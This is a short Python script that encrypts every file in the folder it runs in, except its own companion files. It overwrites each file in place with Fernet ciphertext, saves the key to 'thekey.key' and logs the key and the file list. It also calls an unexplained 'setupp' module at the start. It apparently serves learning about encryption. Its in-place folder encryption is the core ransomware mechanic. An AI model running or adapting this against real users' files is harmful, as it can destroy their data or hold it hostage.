import setupp
modules_used = ["cryptography"]
setupp.inp()

import os
import datetime
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'encrypter.py' or file == 'thekey.key' or file == 'decrypter.py' or file == 'encrypt_log.txt' or file == 'decrypt_log.txt':
        continue
    
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()


with open("thekey.key","wb") as keyfile:
    keyfile.write(key)

for file in files:
    with open(file,'rb') as targetFile:
        contents = targetFile.read()
        enc_contents = Fernet(key).encrypt(contents)
    
    with open(file,'wb') as targetFile:
        targetFile.write(enc_contents)
    
print(f"{len(files)} files Encrypted Successfully")

with open("encrypt_log.txt","a") as log:
    
    x_timestamp = datetime.datetime.now()
    data_log = f"Files encrypted on {x_timestamp} \nNumber of Files Encrypted : {len(files)} \nFiles Encrypted : {files} \nKey : {key} \n\n"
    
    log.write(data_log)